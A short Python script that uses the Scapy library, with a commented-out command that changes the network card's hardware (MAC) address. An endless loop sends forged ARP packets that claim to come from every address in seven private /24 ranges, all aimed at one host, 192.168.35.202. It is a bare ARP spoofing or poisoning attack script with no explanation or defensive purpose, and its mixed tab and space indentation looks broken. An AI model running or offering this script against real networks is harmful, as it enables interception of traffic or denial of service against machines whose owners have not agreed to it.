#!/usr/bin/python
import os
#sudo ifconfig eth2 hw ether b8:ca:3a:af:a7:09
from scapy.all import *

while(1):
    for b in xrange(2, 254):
		send(ARP(psrc="192.168.31."+str(b), pdst="192.168.35.202"))
        	send(ARP(psrc="192.168.32."+str(b), pdst="192.168.35.202"))
        	send(ARP(psrc="192.168.33."+str(b), pdst="192.168.35.202"))
        	send(ARP(psrc="192.168.34."+str(b), pdst="192.168.35.202"))
        	send(ARP(psrc="192.168.35."+str(b), pdst="192.168.35.202"))
        	send(ARP(psrc="192.168.36."+str(b), pdst="192.168.35.202"))
        	send(ARP(psrc="192.168.37."+str(b), pdst="192.168.35.202"))
